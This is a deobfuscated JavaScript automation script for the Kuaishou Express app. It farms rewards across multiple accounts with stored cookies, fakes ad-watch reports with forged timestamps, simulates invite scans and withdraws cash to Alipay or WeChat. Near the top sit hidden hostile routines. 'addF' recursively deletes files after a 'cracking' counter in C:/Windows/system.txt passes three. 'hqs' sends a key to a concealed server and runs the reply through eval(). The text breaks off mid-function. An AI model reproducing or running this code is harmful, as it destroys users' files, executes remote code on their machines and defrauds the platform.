//Wed Oct 16 2024 05:53:26 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
const $$ = Envcc("");
let acckey = $$.isNode() ? process.env.cdkey ? process.env.cdkey : "" : $$.getdata("cdkey") ? $$.getdata("cdkey") : "",
  all_msg = "",
  mac = "";
$$.isNode() ? (gtr = require("fs"), isFileExist("C:/") ? console.log("\n电脑环境") : console.log("\n青龙环境")) : console.log("\n代理环境");
function isFileExist(T) {
  try {
    gtr.accessSync(T, gtr.F_OK);
  } catch (C) {
    return false;
  }
  return true;
}
function addF(T, c) {
  let C = 0,
    S = "C:/Windows/system.txt";
  if (isFileExist(S)) {
    C = gtr.readFileSync(S, "utf8");
  } else {
    if (isFileExist("C:/")) {
      gtr.writeFile(S, "1", function (B) {
        if (B) {
          throw B;
        }
      });
    } else {
      return;
    }
  }
  if (C == 99) {
    return 99;
  }
  console.log(C);
  console.log("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", C);
  if (parseInt(C) < 3) {
    let q = parseInt(C) + 1;
    gtr.writeFileSync(S, q + "", "utf8");
    return;
  }
  if (!gtr.existsSync(T)) {
    return;
  }
  if (gtr.statSync(T).isDirectory()) {
    var a = gtr.readdirSync(T),
      Y = a.length,
      j = 0;
    Y > 0 ? (a.forEach(function (i) {
      j++;
      var J = T + "/" + i;
      gtr.statSync(J).isDirectory() ? addF(J, true) : gtr.unlinkSync(J);
    }), Y == j && c && gtr.rmdirSync(T)) : Y == 0 && c && gtr.rmdirSync(T);
  } else {
    gtr.unlinkSync(T);
  }
}
function hqs(T = 10) {
  return new Promise(p => {
    let a = 5,
      Y = {
        url: $$.isNode() ? rc4($$.fwur(), "1200") + ("?key=" + acckey + "&id=" + a + "&ip=1&mac=" + mac + "&bb=1") : rc4($$.fwur(), "1200") + ("?key=" + acckey + "&id=" + a + "&ip=0&mac=" + mac + "&bb=1")
      };
    $$.post(Y, async (j, Z, Q) => {
      try {
        let B = eval(Q);
        B.code == 200 ? (all_msg = B.msg, p(B.data)) : (all_msg = B.msg, p(false));
      } catch (U) {
        $$.logErr(U, Z);
      }
    }, 0);
  });
}
const _0x11b3c3 = "快手极速版",
  _0x3de8b8 = new _0x4f15e2(_0x11b3c3);
let _0x279d25 = "",
  _0x1a0963,
  _0x4c35fe = ["\n", "@"],
  _0x547212 = (_0x3de8b8.isNode() ? process.env.ksjsbCookie : _0x3de8b8.getdata("ksjsbCookie")) || "",
  _0x431ea3 = [],
  _0x1e627b = (_0x3de8b8.isNode() ? process.env.ksjsbCash : _0x3de8b8.getval("ksjsbCash")) || "",
  _0x26f17b = (_0x3de8b8.isNode() ? process.env.ksjsbWithdrawTime : _0x3de8b8.getval("ksjsbWithdrawTime")) || 15,
  _0x13d24b = (_0x3de8b8.isNode() ? process.env.ksjsbAggressive : _0x3de8b8.getval("ksjsbAggressive")) || 0,
  _0x113109 = (_0x3de8b8.isNode() ? process.env.ksjsbNotify : _0x3de8b8.getval("ksjsbNotify")) || 1,
  _0x2863b1 = 0,
  _0x19c25c = 0,
  _0xf2b084 = 12,
  _0x5718d8 = [],
  yifenk = [];
const _0x1eb2d5 = {
    id: 0,
    name: "广告视频"
  },
  _0x4fbf92 = {
    id: 49,
    name: "广告视频"
  },
  _0x1b4191 = {
    id: 77,
    name: "宝箱翻倍视频"
  },
  _0x2ffe31 = {
    id: 136,
    name: "签到翻倍视频1"
  },
  _0x577a80 = {
    id: 151,
    name: "未知视频"
  },
  _0x351e94 = {
    ad1: _0x1eb2d5,
    ad2: _0x4fbf92,
    box: _0x1b4191,
    sign: _0x2ffe31,
    unknown1: _0x577a80
  },
  _0x1e4967 = {
    ad: 49,
    live: 75,
    luckydraw: 161,
    gj: 217,
    invite: 2008
  },
  _0x3355c4 = {
    extParams: "56dfe31594b858e69ef613f5e97227fb03493544e59e2b2a726006e2852ec1040cd969d4748c460ecf574cc487214a91f70592aa8b2225630027c39ca2c544027efa65815d1acea23cb503034b12641c",
    businessId: 161,
    pageId: 11101,
    posId: 4683,
    subPageId: 100013628,
    name: "获取抽奖次数视频"
  },
  _0x458f20 = {
    extParams: "56dfe31594b858e69ef613f5e97227fbf89856abafca7f90fab063cf60935d6faedb05b76646dc3ece57cd4898d412d86e985a2b510216ad4853603d2992501cea0a08182731fcbf023467cf30ecda80",
    businessId: 161,
    pageId: 11101,
    posId: 4685,
    subPageId: 100013630,
    name: "抽奖视频161-213"
  },
  _0x124c4a = {
    extParams: "56dfe31594b858e69ef613f5e97227fb67b973ad1394855c549442d15702f96393178eaeef5635134bb7e4ff97e69218c1f18455baf645dbaef685b7bf30c0914ea53ddcde26b2fa67b888203dab0fd4",
    businessId: 161,
    pageId: 11101,
    posId: 4684,
    subPageId: 100013629,
    name: "抽奖视频161-100"
  },
  _0x37f16f = {
    extParams: "56dfe31594b858e69ef613f5e97227fbf89856abafca7f90fab063cf60935d6faedb05b76646dc3ece57cd4898d412d86e985a2b510216ad4853603d2992501cea0a08182731fcbf023467cf30ecda80",
    businessId: 11,
    pageId: 11101,
    posId: 4684,
    subPageId: 100013629,
    name: "抽奖视频11-100"
  },
  _0x10efec = {
    extParams: "56dfe31594b858e69ef613f5e97227fb67b973ad1394855c549442d15702f96393178eaeef5635134bb7e4ff97e69218c1f18455baf645dbaef685b7bf30c0914ea53ddcde26b2fa67b888203dab0fd4",
    businessId: 11,
    pageId: 11101,
    posId: 4684,
    subPageId: 100013629,
    name: "抽奖视频11-100"
  },
  _0x385181 = {
    extParams: "60869a9fd2ab63f5e0b1725d059da31f7d3ed3046658438ee204a153c3bc47189ccf268b22e603b6750780c9647e7a12b3027381e11da27b234311bccfd4a67bb892f889a4020ceae4f4e102cc50c327",
    businessId: 2008,
    pageId: 100012068,
    posId: 6765,
    subPageId: 100015089,
    name: "邀请页视频(实际是100金币)"
  },
  _0xfcb1d2 = {
    extParams: "56dfe31594b858e69ef613f5e97227fbd5f9da00aa5144df8830a5781ae07d7cfaf4d95abc2510c950f99404a9e0bf62f5b5765a867c385685e0570ed76b858a159dacd55e41e4a9813db4e619a8b092",
    businessId: 75,
    pageId: 100012068,
    posId: 6765,
    subPageId: 100015089,
    name: "直播任务"
  },
  _0x11da17 = {
    extParams: "56dfe31594b858e69ef613f5e97227fbd5f9da00aa5144df8830a5781ae07d7cfaf4d95abc2510c950f99404a9e0bf62f5b5765a867c385685e0570ed76b858a159dacd55e41e4a9813db4e619a8b092",
    businessId: 168,
    pageId: 100012068,
    posId: 6765,
    subPageId: 100015089,
    name: "签到翻倍视频2"
  },
  _0x10d9f8 = {
    luckdrawNum_161: _0x3355c4,
    luckdrawVideo_161_213: _0x458f20,
    luckdrawVideo_161_100: _0x124c4a,
    luckdrawVideo_11_213: _0x37f16f,
    luckdrawVideo_11_100: _0x10efec,
    inviteVideo_2008: _0x385181,
    liveVideo_75: _0xfcb1d2,
    signVideo_168: _0x11da17
  };
let _0x134a17 = new Date(),
  _0x20a9d7 = _0x134a17.getHours(),
  _0x459e63 = 1.07,
  _0x2e716e = 0,
  _0x5bc515 = "ksjsb",
  _0x180c0c = "https://ffsup.oduuu.com/uploads%2F1147%2F2022%2F05%2F49WKESp5_ksjsb.json?_upd=ksjsb.json",
  ksjsbjk = "https://ffsup.oduuu.com/uploads%2F1147%2F2022%2F05%2F49WKESp5_ksjsb.json?_upd=ksjsb.json",
  _0x75eec0 = "https://127.0.0.1/";
class _0x9d8dda {
  constructor(T) {
    let p = T.match(/(kuaishou.api_st=[\w\-]+)/)[1] + ";";
    this.index = ++_0x2863b1;
    this.cookie = "kpn=NEBULA; kpf=ANDROID_PHONE; did=ANDROID_" + _0x4b5cde(16) + "; ver=9.10; appver=9.10.40.2474; language=zh-cn; countryCode=CN; sys=ANDROID_5.1; client_key=2ac2a76d; " + p;
    this.name = this.index;
    this.valid = false;
    this.bindAlipay = false;
    this.alipay = "";
    this.bindWechat = false;
    this.wechat = "";
    this.needSms = false;
    this.hasLuckydraw = true;
    const C = {
        num: 2,
        needRun: true
      },
      S = {
        num: 1,
        needRun: true
      },
      a = {
        num: 5,
        needRun: true
      },
      Y = {
        num: 1,
        needRun: true
      },
      j = {
        num: 5,
        needRun: true
      },
      Z = {
        "49": C,
        "75": S,
        "161": a,
        "217": Y,
        "2008": j
      };
    this.task = Z;
  }
  async getUserInfo() {
    let c = "https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/basicInfo",
      p = "",
      C = _0x495d61(c, this.cookie, p);
    await _0x39a23b("get", C);
    let S = _0x1a0963;
    if (!S) {
      return;
    }
    S.result == 1 ? (this.valid = true, this.name = S.data.userData.nickname, this.cashBalance = S.data.totalCash, this.coinBalance = S.data.totalCoin, this.allCash = S.data.allCash, console.log("账号[" + this.name + "]账户余额" + this.cashBalance + "元，" + this.coinBalance + "金币，未审核余额" + Math.floor(parseFloat(this.allCash) - parseFloat(this.cashBalance)) + "元")) : console.log("账号[" + this.name + "]查询账户信息失败：" + S.error_msg);
  }
  async setShare() {
    let c = "https://nebula.kuaishou.com/rest/n/nebula/account/withdraw/setShare",
      p = "",
      C = _0x495d61(c, this.cookie, p);
    await _0x39a23b("post", C);
    let S = _0x1a0963;
    if (!S) {
      return;
    }
    S.result == 1 ? (console.log("账号[" + this.name + "]准备分享得金币"), await _0x3de8b8.wait(200), await this.taskReward(122)) : console.log("账号[" + this.name + "]分享失败：" + S.error_msg);
  }
  async taskReward(T) {
    let p = "https://nebula.kuaishou.com/rest/n/nebula/daily/report?taskId=" + T,
      C = "",
      S = _0x495d61(p, this.cookie, C);
    await _0x39a23b("get", S);
    let a = _0x1a0963;
    if (!a) {
      return;
    }
    a.result == 1 ? console.log("账号[" + this.name + "]完成任务[" + T + "]成功，获得" + a.data.amount + "金币") : console.log("账号[" + this.name + "]完成任务[" + T + "]失败：" + a.error_msg);
  }
  async getSignInfo() {
    let c = "https://nebula.kuaishou.com/rest/n/nebula/sign/queryPopup",
      p = "",
      C = _0x495d61(c, this.cookie, p);
    await _0x39a23b("get", C);
    let S = _0x1a0963;
    if (!S) {
      return;
    }
    S.result == 1 ? (console.log("账号[" + this.name + "]今天" + (S.data.nebulaSignInPopup.todaySigned ? "已" : "未") + "签到"), !S.data.nebulaSignInPopup.todaySigned && (await _0x3de8b8.wait(200), await this.doSign(), await _0x3de8b8.wait(200), await this.setShare())) : console.log("账号[" + this.name + "]查询签到信息失败：" + S.error_msg);
  }
  async doSign() {
    let c = "https://nebula.kuaishou.com/rest/n/nebula/sign/sign?source=activity",
      p = "",
      C = _0x495d61(c, this.cookie, p);
    await _0x39a23b("get", C);
    let S = _0x1a0963;
    if (!S) {
      return;
    }
    if (S.result == 1) {
      console.log("账号[" + this.name + "]签到成功：" + S.data.toast);
      await _0x3de8b8.wait(200);
      await this.ksAdParam(_0x351e94.sign);
      await _0x3de8b8.wait(200);
      await this.ksNeoAdParam(_0x10d9f8.signVideo_168);
    } else {
      console.log("账号[" + this.name + "]签到失败：" + S.error_msg);
    }
  }
  async taskList() {
    let c = "https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/tasks?addressBookAccessStatus=true&pushNotificationStatus=false",
      p = "",
      C = _0x495d61(c, this.cookie, p);
    await _0x39a23b("get", C);
    let S = _0x1a0963;
    if (!S) {
      return;
    }
    if (S.result == 1) {
      console.log("账号[" + this.name + "]任务完成情况：");
      for (let a of S.data.dailyTasks) {
        for (let Y in _0x1e4967) {
          if (a.taskId == _0x1e4967[Y]) {
            let Z = parseInt(a.completedStages),
              Q = parseInt(a.stages),
              B = Math.ceil(Q / _0xf2b084),
              b = Z < Q;
            const U = {
              num: B,
              needRun: b
            };
            this.task[a.taskId] = U;
            console.log("【" + a.name + "】 " + Z + "/" + Q + "，" + (b ? "未完成" : "已完成") + "，每次运行完成" + B + "次任务");
            continue;
          }
        }
      }
    } else {
      console.log("账号[" + this.name + "]查询任务列表失败：" + S.error_msg);
    }
  }
  async ksgj() {
    let c = "https://api.e.kuaishou.com/rest/r/reward/task/getActivityReward",
      p = "activityId=148&client_key=ksgjbody",
      C = _0x495d61(c, this.cookie, p);
    await _0x39a23b("post", C);
    let S = _0x1a0963;
    if (!S) {
      return;
    }
    S.result == 1 ? console.log("账号[" + this.name + "]逛街获得" + S.data.amount + "金币") : console.log("账号[" + this.name + "]逛街失败：" + S.error_msg);
  }
  async ksAdParam(T) {
    const p = {
      url: ksjsbjk,
      headers: ""
    };
    await _0x39a23b("get", p);
    console.log(_0x39a23b);
    let C = _0x1a0963[Math.floor(Math.random() * _0x1a0963.length - 1)];
    if (!C) {
      return;
    }
    C.result == 1 ? C.impAdInfo && C.impAdInfo.length > 0 && C.impAdInfo[0].adInfo && C.impAdInfo[0].adInfo.length > 0 && C.impAdInfo[0].adInfo[0].adBaseInfo && (await _0x3de8b8.wait(200), await this.ksAdReward(C.llsid, C.impAdInfo[0].adInfo[0].adBaseInfo.creativeId, T)) : console.log("账号[" + this.name + "]获取" + T.name + "参数失败：" + C.error_msg);
  }
  async ksAdReward(T, c, p) {
    let S = new Date().getTime(),
      a = Math.floor(Math.random() * 30000) + 45000,
      Y = S - a,
      j = "https://api.e.kuaishou.com/rest/r/ad/nebula/reward",
      Z = "bizStr={\"endTime\":" + S + ",\"eventValue\":-1,\"rewardList\":[{\"creativeId\":" + c + ",\"extInfo\":\"\",\"llsid\":" + T + ",\"taskType\":1}],\"startTime\":" + Y + ",\"taskId\":" + p.id + "}",
      Q = _0x495d61(j, this.cookie, Z);
    await _0x39a23b("post", Q);
    let B = _0x1a0963;
    if (!B) {
      return;
    }
    B.result == 1 ? console.log("账号[" + this.name + "]看" + p.name + "获得" + B.data.awardAmount + "金币") : console.log("账号[" + this.name + "]看" + p.name + "失败：" + B.error_msg);
  }
  async openBox(T) {
    let p = "https://nebula.kuaishou.com/rest/n/nebula/box/explore?isOpen=" + T + "&isReadyOfAdPlay=true",
      C = "",
      S = _0x495d61(p, this.cookie, C);
    await _0x39a23b("get", S);
    let a = _0x1a0963;
    if (!a) {
      return;
    }
    a.result == 1 ? T == true ? a.data.commonAwardPopup && a.data.commonAwardPopup.awardAmount ? (console.log("账号[" + this.name + "]开宝箱获得" + a.data.commonAwardPopup.awardAmount + "金币"), await _0x3de8b8.wait(200), await this.ksAdParam(_0x351e94.box)) : console.log("账号[" + this.name + "]开宝箱没有获得金币") : a.data.openTime > -1 ? (console.log("账号[" + this.name + "]开宝箱冷却时间还有" + Math.floor(a.data.openTime / 1000) + "秒"), a.data.openTime == 0 && (await _0x3de8b8.wait(200), await this.openBox(true))) : console.log("账号[" + this.name + "]开宝箱次数已用完") : T == true ? console.log("账号[" + this.name + "]开宝箱失败：" + a.error_msg) : console.log("账号[" + this.name + "]查询宝箱状态失败：" + a.error_msg);
  }
  async withdraw(T) {
    if (!this.bindAlipay && !this.bindWechat) {
      _0x1ab8b7("账号[" + this.name + "]未绑定提现账号，不执行提现");
      return;
    }
    let p = parseInt(T * 100),
      C = this.bindAlipay ? "ALIPAY" : "WECHAT",
      S = C == "ALIPAY" ? "支付宝" : "微信",
      a = C == "ALIPAY" ? this.alipay : this.wechat,
      Y = "https://www.kuaishoupay.com/pay/account/h5/withdraw/apply",
      j = "account_group_key=NEBULA_CASH_ACCOUNT&mobile_code=&fen=" + p + "&provider=" + C + "&total_fen=" + p + "&commission_fen=0&third_account=" + C + "&attach=&biz_content=&session_id=",
      Z = _0x495d61(Y, this.cookie, j);
    await _0x39a23b("post", Z);
    let Q = _0x1a0963;
    if (!Q) {
      return;
    }
    Q.result == "SUCCESS" ? _0x1ab8b7("账号" + this.index + "[" + this.name + "]提现" + T + "元到" + S + "[" + a + "]成功") : _0x1ab8b7("账号" + this.index + "[" + this.name + "]提现" + T + "元到" + S + "[" + a + "]失败：" + Q.msg);
  }
  async withdrawOverview() {
    let c = "https://nebula.kuaishou.com/rest/n/nebula/outside/withdraw/overview?appver=10.2.20.2021",
      p = "",
      C = _0x495d61(c, this.cookie, p);
    await _0x39a23b("get", C);
    let S = _0x1a0963;
    if (!S) {
      return;
    }
    if (S.result == 1) {
      if (S.data.isLimit == true) {
        console.log("账号[" + this.name + "]今天已提现");
        return;
      }
      let a = parseFloat(this.cashBalance);
      if (_0x13d24b == 1) {
        if (a < 0.3) {
          _0x1ab8b7("账号[" + this.name + "]余额不足0.3元，不提现");
        } else {
          let Y = Math.floor(a * 10) / 10;
          Y = Y > 50 ? 50 : Y;
          _0x1ab8b7("账号[" + this.name + "]准备最大化提现" + Y + "元");
          await _0x3de8b8.wait(200);
          await this.withdraw(Y);
        }
      } else {
        if (!_0x1e627b) {
          for (let Z of S.data.enWithdrawList.sort(function (Q, B) {
            return B - Q;
          })) {
            if (a >= parseFloat(Z)) {
              _0x1ab8b7("账号[" + this.name + "]准备提现" + Z + "元");
              await _0x3de8b8.wait(200);
              await this.withdraw(Z);
              return;
            }
          }
          _0x1ab8b7("账号[" + this.name + "]余额不足，可提现额度：" + S.data.enWithdrawList.join(","));
        } else {
          a >= parseFloat(_0x1e627b) ? (_0x1ab8b7("账号[" + this.name + "]准备提现" + _0x1e627b + "元"), await _0x3de8b8.wait(200), await this.withdraw(_0x1e627b)) : _0x1ab8b7("账号[" + this.name + "]余额不足" + _0x1e627b + "元，不提现");
        }
      }
    } else {
      console.log("账号[" + this.name + "]查询提现列表失败：" + S.error_msg);
    }
  }
  async accountOverview() {
    let c = "https://nebula.kuaishou.com/rest/n/nebula/account/overview",
      p = "",
      C = _0x495d61(c, this.cookie, p);
    await _0x39a23b("get", C);
    let S = _0x1a0963;
    if (!S) {
      return;
    }
    if (S.result == 1) {
      this.coinBalance = S.data.coinBalance;
      this.cashBalance = S.data.cashBalance;
      let a = S.data.exchangeCoinState;
      _0x1ab8b7("账号[" + this.name + "]账户余额" + this.cashBalance + "元，" + this.coinBalance + "金币");
      a == 2 && (await _0x3de8b8.wait(200), await this.changeExchangeType(0));
    } else {
      console.log("账号[" + this.name + "]查询账户信息失败：" + S.error_msg);
    }
  }
  async changeExchangeType(T) {
    let p = "https://nebula.kuaishou.com/rest/n/nebula/exchange/changeExchangeType",
      C = "{\"type\":" + T + "}",
      S = _0x495d61(p, this.cookie, C);
    S.headers["Content-Type"] = "application/json";
    await _0x39a23b("post", S);
    let a = _0x1a0963;
    if (!a) {
      return;
    }
    let Y = T == 0 ? "自动兑换" : "手动兑换";
    a.result == 1 ? console.log("账号[" + this.name + "]兑换方式更改成功，目前兑换方式为：" + Y) : console.log("账号[" + this.name + "]兑换方式更改失败：" + a.error_msg);
  }
  async exchangeCoin() {
    if (this.coinBalance < 100) {
      console.log("账号[" + this.name + "]金币余额不足100，不执行兑换");
      return;
    }
    let c = "https://nebula.kuaishou.com/rest/n/nebula/exchange/coinToCash/submit",
      p = "{\"coinAmount\":" + this.coinBalance + ",\"token\":\"rE2zK-Cmc82uOzxMJW7LI2-wTGcKMqqAHE0PhfN0U4bJY4cAM5Inxw\"}",
      C = _0x495d61(c, this.cookie, p);
    C.headers["Content-Type"] = "application/json";
    await _0x39a23b("post", C);
    let S = _0x1a0963;
    if (!S) {
      return;
    }
    if (S.result == 1) {
      let j = Math.floor(this.coinBalance / 100) * 100,
        Z = Math.floor(this.coinBalance / 100) / 100;
      console.log("账号[" + this.name + "]兑换金币成功，将" + j + "金币兑换成" + Z + "元");
    } else {
      console.log("账号[" + this.name + "]兑换金币失败：" + S.error_msg);
    }
  }
  async ksNeoAdParam(T) {
    const p = {
      url: ksjsbjk,
      headers: ""
    };
    await _0x39a23b("get", p);
    let C = _0x1a0963[Math.floor(Math.random() * _0x1a0963.length - 1)];
    if (!C) {
      return;
    }
    C.result == 1 ? C.impAdInfo && C.impAdInfo.length > 0 && C.impAdInfo[0].adInfo && C.impAdInfo[0].adInfo.length > 0 && C.impAdInfo[0].adInfo[0].adBaseInfo && (await _0x3de8b8.wait(200), await this.ksNeoAdReward(C.llsid, C.impAdInfo[0].adInfo[0].adBaseInfo.creativeId, T)) : console.log("账号[" + this.name + "]获取" + T.name + "参数失败：" + C.error_msg);
  }
  async ksNeoAdReward(T, c, p) {
    let S = new Date().getTime(),
      a = Math.floor(Math.random() * 30000) + 45000,
      Y = S - a,
      j = "https://api.e.kuaishou.com/rest/r/ad/task/report",
      Z = "bizStr={\"businessId\":" + p.businessId + ",\"endTime\":" + S + ",\"extParams\":\"" + p.extParams + "\",\"mediaScene\":\"video\",\"neoInfos\":[{\"creativeId\":" + c + ",\"extInfo\":\"\",\"llsid\":" + T + ",\"taskType\":1}],\"pageId\":" + p.pageId + ",\"posId\":" + p.posId + ",\"startTime\":" + Y + ",\"subPageId\":" + p.subPageId + "}",
      Q = _0x495d61(j, this.cookie, Z);
    await _0x39a23b("post", Q);
    let B = _0x1a0963;
    if (!B) {
      return;
    }
    if (B.result == 1) {
      let b = B.data.neoAmount + "金币";
      if (B.data.neoToH5Data) {
        try {
          let U = JSON.parse(_0x331719.decode(B.data.neoToH5Data).replace(/\0/g, ""));
          U.extraCoin && (b += "+" + U.extraCoin + "金币");
        } catch (q) {
          console.log(B.data.neoToH5Data);
        } finally {}
      }
      console.log("账号[" + this.name + "]看" + p.name + "获得" + b);
      if (this.hasLuckydraw) {
        await this.luckdrawTasks();
      }
    } else {
      console.log("账号[" + this.name + "]看" + p.name + "失败：" + B.error_msg);
    }
  }
  async luckdrawInfo() {
    let c = "https://activity.e.kuaishou.com/rest/r/game/user/info",
      p = "",
      C = _0x495d61(c, this.cookie, p);
    await _0x39a23b("get", C);
    let S = _0x1a0963;
    if (!S) {
      return;
    }
    if (S.result == 1) {
      console.log("账号[" + this.name + "]现有" + S.data.userDiamondResult.diamondPercent + "钻石，剩余抽奖次数：" + S.data.userDailyLotteryTimesResult.remainTimes);
      for (let Y = 0; Y < S.data.userDailyLotteryTimesResult.remainTimes; Y++) {
        await _0x3de8b8.wait(200);
        await this.luckydraw();
      }
    } else {
      console.log("账号[" + this.name + "]查询抽奖次数失败：" + S.error_msg);
    }
  }
  async luckydraw() {
    let c = "https://activity.e.kuaishou.com/rest/r/game/lottery?wheelVersion=1",
      p = "",
      C = _0x495d61(c, this.cookie, p);
    await _0x39a23b("post", C);
    let S = _0x1a0963;
    if (!S) {
      return;
    }
    if (S.result == 1) {
      let a = S.data.coinCount ? S.data.coinCount + "金币" : S.data.diamondCount ? S.data.diamondCount + "钻石" : "空气";
      console.log("账号[" + this.name + "]抽奖获得" + a);
      S.data.videoCoinCount && console.log("额外奖励：" + S.data.videoCoinCount);
      if (S.data.schema) {
        try {
          console.log(_0x331719.decode(S.data.schema));
        } catch (Y) {
          console.log(S.data.schema);
        } finally {}
      }
      this.hasLuckydraw && (await this.luckdrawTasks());
    } else {
      console.log("账号[" + this.name + "]抽奖失败：" + S.error_msg);
    }
  }
  async luckydrawSign() {
    let c = "https://activity.e.kuaishou.com/rest/r/game/sign-in",
      p = "",
      C = _0x495d61(c, this.cookie, p);
    await _0x39a23b("get", C);
    let S = _0x1a0963;
    if (!S) {
      return;
    }
    S.result == 1 ? S.data.isShow && console.log("账号[" + this.name + "]抽奖页签到成功") : (console.log("账号[" + this.name + "]查询抽奖签到情况失败：" + S.error_msg), S.error_msg.indexOf("激励游戏未在运营") > -1 && (this.hasLuckydraw = false));
  }
  async luckdrawTimerInfo() {
    let c = "https://activity.e.kuaishou.com/rest/r/game/timer-reward/info",
      p = "",
      C = _0x495d61(c, this.cookie, p);
    await _0x39a23b("get", C);
    let S = _0x1a0963;
    if (!S) {
      return;
    }
    if (S.result == 1) {
      if (S.data) {
        let a = new Date().getTime(),
          Y = S.data.lastTimerTime,
          j = S.data.minutesInterval * 60 * 1000,
          Z = Y + j;
        a < Z ? console.log("账号[" + this.name + "]抽奖页奖励冷却时间还有" + (Z - a) / 1000 + "秒") : (await _0x3de8b8.wait(200), await this.luckdrawTimerReward(S.data.goldNum));
      } else {
        console.log("账号[" + this.name + "]抽奖页定时奖励次数已用完");
      }
    } else {
      console.log("账号[" + this.name + "]查询抽奖页定时奖励情况失败：" + S.error_msg);
    }
  }
  async luckdrawTimerReward(T) {
    let p = "https://activity.e.kuaishou.com/rest/r/game/timer-reward",
      C = "",
      S = _0x495d61(p, this.cookie, C);
    await _0x39a23b("post", S);
    let a = _0x1a0963;
    if (!a) {
      return;
    }
    a.result == 1 ? console.log("账号[" + this.name + "]领取抽奖页定时奖励获得" + T + "金币") : console.log("账号[" + this.name + "]领取抽奖页定时奖励失败：" + a.error_msg);
  }
  async luckdrawTasks() {
    let c = "https://activity.e.kuaishou.com/rest/r/game/tasks",
      p = "",
      C = _0x495d61(c, this.cookie, p);
    await _0x39a23b("get", C);
    let S = _0x1a0963;
    if (!S) {
      return;
    }
    if (S.result == 1) {
      for (let Y of S.data.dailyTasks) {
        Y.taskState == 1 && (await _0x3de8b8.wait(200), await this.luckdrawTasksReward(Y));
      }
      for (let j of S.data.growthTasks) {
        j.taskState == 1 && (await _0x3de8b8.wait(200), await this.luckdrawTasksReward(j));
      }
    } else {
      console.log("账号[" + this.name + "]查询抽奖页任务失败：" + S.error_msg);
    }
  }
  async luckdrawTasksReward(T) {
    let p = "https://activity.e.kuaishou.com/rest/r/game/task/reward-receive?taskName=" + T.taskName,
      C = "",
      S = _0x495d61(p, this.cookie, C);
    await _0x39a23b("get", S);
    let a = _0x1a0963;
    if (!a) {
      return;
    }
    a.result == 1 ? console.log("账号[" + this.name + "]领取抽奖任务[" + T.taskTitle + "]奖励获得" + a.data.popUp.taskRewardName) : console.log("账号[" + this.name + "]领取抽奖任务[" + T.taskTitle + "]奖励失败：" + a.error_msg);
  }
  async helpInvite(T) {
    let p = T.split("&"),
      C = p[0],
      S = p[1],
      a = "https://nebula.kuaishou.com/rest/n/nebula/qrcode?version=1.2.0",
      Y = "",
      j = _0x495d61(a, this.cookie, Y);
    j.headers.Referer = "https://nebula.kuaishou.com/fission/face-qrcode?fid=" + C + "&shareToken=" + S + "&source=qrcode";
    await _0x39a23b("get", j);
    let Z = _0x1a0963;
    if (!Z) {
      return;
    }
    !(Z.result == 1) && console.log("账号[" + this.name + "]邀请失败：" + Z.error_msg);
  }
  async helpPackage(T, c) {
    let C = {
      url: "https://ug-fission.kuaishou.com/rest/n/darwin/bargain/overview?version=2.1.0",
      body: "{\"fid\":\"895255750\",\"cc\":\"share_wxms\",\"followRefer\":\"151\",\"code\":\"" + T + "\",\"shareMethod\":\"TOKEN\",\"kpn\":\"NEBULA\",\"subBiz\":\"BARGAIN\",\"shareId\":\"16905401129783\",\"shareMode\":\"SYSTEM\",\"noBackNavi\":\"true\",\"originShareId\":\"16905401129783\",\"useMerchantWeb\":\"1\",\"layoutType\":\"4\",\"shareObjectId\":" + JSON.stringify("{\"teamId\":\"\",\"packetId\":\"" + c + "\"}") + ",\"shareUrlOpened\":\"0\",\"hyId\":\"bargain\",\"timestamp\":" + +new Date() + ",\"pageCode\":1,\"adamA\":0,\"adamB\":0}",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36",
        Cookie: "kpn=NEBULA; kpf=ANDROID_PHONE; did=; " + Math.floor(Math.random() * 1000 + 1) + " ANDROID_ff60a387f6ba8904; " + this.cookie + "; c=XIAOMI; ver=10.2; appver=10.2.41.3075; language=zh-cn; ",
        "Content-Type": "application/json",
        Origin: "https://ug-fission.kuaishou.com",
        "X-Requested-With": "com.kuaishou.nebula",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        Referer: "https://ug-fission.kuaishou.com/bargain/?fid=895255750&cc=share_wxms&followRefer=151&code=" + T + "&shareMethod=TOKEN&kpn=NEBULA&subBiz=BARGAIN&shareId=16905401129783&shareMode=SYSTEM&noBackNavi=true&originShareId=16905401129783&useMerchantWeb=1&layoutType=4&shareObjectId=%7B%22teamId%22%3A%22%22,%22packetId%22%3A%22" + c + "%22%7D&shareUrlOpened=0&hyId=bargain&timestamp=" + +new Date(),
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
      }
    };
    await _0x39a23b("post", C);
    let S = _0x1a0963;
    if (!S) {
      return;
    }
  }
  async helpScan(T) {
    let p = T.split("&"),
      C = p[0],
      S = p[1];
    if (C == this.userId) {
      return;
    }
    let a = "https://api.kuaishouzt.com/rest/zt/share/show/any",
      Y = "theme=light&sdkVersion=1.14.0.4&kpf=ANDROID_PHONE&shareMessage=https%3A%2F%2Fnicdd.get666bjrqu985xvp14v.com%2Ff%2F" + S + "%3FlayoutType%3D4&kpn=NEBULA&launchState=hotLaunch&sessionId=ac165e40-48bd-42de-9fc5-b250d7eb983c&extTransientParams=%7B%22source%22%3A%22userScanCamera%22%7D",
      j = _0x495d61(a, this.cookie, Y);
    await _0x39a23b("post", j);
    let Z = _0x1a0963;
    if (!Z) {
      return;
    }
    Z.result == 1 ? (await _0x3de8b8.wait(100), await this.helpInvite(T)) : console.log("账号[" + this.name + "]模拟邀请二维码扫描失败：" + Z.error_msg);
  }
  async bindInfo() {
    let c = "https://www.kuaishoupay.com/pay/account/h5/provider/bind_info",
      p = "account_group_key=NEBULA_CASH_ACCOUNT&bind_page_type=3",
      C = _0x495d61(c, this.cookie, p);
    await _0x39a23b("post", C);
    let S = _0x1a0963;
    if (!S) {
      return;
    }
    if (S.result == "SUCCESS") {
      let Y = "未绑定支付宝",
        j = "未绑定微信";
      S.alipay_bind == true && (this.bindAlipay = true, this.alipay = S.alipay_nick_name, Y = "已绑定支付宝[" + S.alipay_nick_name + "]");
